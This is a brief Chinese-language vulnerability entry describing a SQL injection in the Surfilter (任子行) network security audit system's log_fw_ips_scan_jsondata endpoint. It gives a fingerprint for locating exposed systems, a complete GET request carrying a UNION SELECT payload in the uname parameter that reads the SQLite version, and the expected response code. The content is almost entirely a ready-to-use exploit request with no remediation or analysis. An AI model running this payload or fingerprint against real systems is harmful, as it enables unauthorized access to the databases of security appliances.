# 任子行网络安全审计系统log_fw_ips_scan_jsondataSQL注入漏洞

任子行网络安全审计系统log_fw_ips_scan_jsondata ｜ SQL注入 ｜ —
- **指纹**：`title="任子行网络安全审计系统"`
- **请求**：`GET /webui/?g=log_fw_ips_scan_jsondata&uname='+union+select+sqlite_version(),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--+ HTTP/1.1`
- **响应特征**：200